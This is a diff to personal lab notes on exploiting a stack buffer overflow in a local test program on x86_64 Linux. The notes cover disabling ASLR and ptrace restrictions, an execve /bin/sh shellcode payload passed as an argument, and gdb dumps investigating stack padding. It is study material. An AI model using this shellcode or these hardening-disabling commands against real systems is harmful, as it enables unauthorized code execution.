@@ -56,6 +56,7 @@ $ python2 -c  'print "A" * 264 + "\x7f\xff\xff\xdc\x90\x0d"[::-1] ' | hexdump -v
 To disable aslr and config yama to allow gdb to attach to process
 echo kernel.randomize_va_space=0 > /etc/sysctl.d/01_disable_aslr.conf
 echo kernel.yama.ptrace_scope=0 > /etc/sysctl.d/01_ptrace.conf
+sysctl --system
 
 
 This says that readelf -l shows stack as read/write then its not execuatable.
@@ -64,5 +65,77 @@ Odd, I have execstack on my compile line
 Ahh, I need to add the line to linker as well.  FWIW, there is a tool
 called execstack which can be used to do it post install.  I could not find it.
 My earlier notes found this I need to find those.
+
+[davis@yoshi progs]$ cat /usr/include/asm/unistd_64.h  | grep execv
+#define __NR_execve 59
+#define __NR_execveat 322
+
+set $esp = 0x7fffffffde40
+
+More info on leave and ret instructions
+
+This is for 32-bit using AT&T syntax (gcc/gas) where movl src,dst.
+leave:
+movl %ebp, %esp
+popl %ebp
+
+For x86_64 its rsp and rbp
+
+ret:
+	pop stack into IP
+
+After the gdb work, uncomment the printf to get the buffer address and adjust the buffer so it uses
+that address.  This is the result using coders method:
+
+[davis@yoshi x86_64]$ ./bof `printf "\xeb\x23\x5f\x80\x77\x07\x41\x48\x8d\x07\x48\x89\x47\x08\x48\x89\xfe\x48\x83\xc6\x08\x48\x31\xd2\x48\x89\x57\x10\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05\xe8\xd8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\xa0\xde\xff\xff\xff\x7f"`
+
+I'm not sure about the padding I added between 41's to fill out the buffer and the buffer address which is 0x42's.It should not be there, but it is.  Possible explanations:
+ o It is so that the return address is stored on an even word boundary.  
+ o It is something required to call strcpy with sse extensions?  I did the following trying to look into it
+
+	I ran the code using the buffer I used above. This allows me to see the address for this space:
+
+Right after the leaveq instruction following the strcpy.
+
+(gdb) x/4xg $rsp
+0x7fffffffde78: 0x00007fffffffde30      0x0000000000000000
+0x7fffffffde88: 0x0000000200000000      0x00007fffffffdf58
+
+This shows my ret address being in right place.  Back up 8 bytes to see the spacer.
+(gdb) x/4xg 0x007fffffffde70
+0x7fffffffde70: 0x4242424242424242      0x00007fffffffde30
+0x7fffffffde80: 0x0000000000000000      0x0000000200000000
+
+Now rerun, and dump this same address before its overwritten
+This is done as soon as I hit the breakpoint in argc != 2 check
+
+(gdb) x/4xg 0x007fffffffde70
+0x7fffffffde70: 0x00000000006b2170      0x0000000000400bf3
+0x7fffffffde80: 0x0000000000000000      0x0000000200000000
+
+So, what is at that address?  I was guessing it was going to be argv[1] like in x86 days.  They did push
+the function parms before pushing the return address, right?
+
+Hmm, so its not that, its another offset
+(gdb) x/4xg 0x00000000006b2170
+0x6b2170:       0x000000000042a5d0      0x0000000000422900
+
+Hmm, deeper in the rabbit hole, 
+(gdb) x/4xg 0x000000000042a5d0
+0x42a5d0 <__strcpy_ssse3>:      0x3980fa8948f18948      0x8000001691840f00
+0x42a5e0 <__strcpy_ssse3+16>:   0x001697840f000179      0x9d840f0002798000
+
+(gdb) print (char *) 0x000000000042a5d0
+$3 = 0x42a5d0 <__strcpy_ssse3> "H\211\361H\211\372\200\071"
+
+Not a string and I'm running out of time, so punt.
+
+
+
+
+
+
+
+
 
 
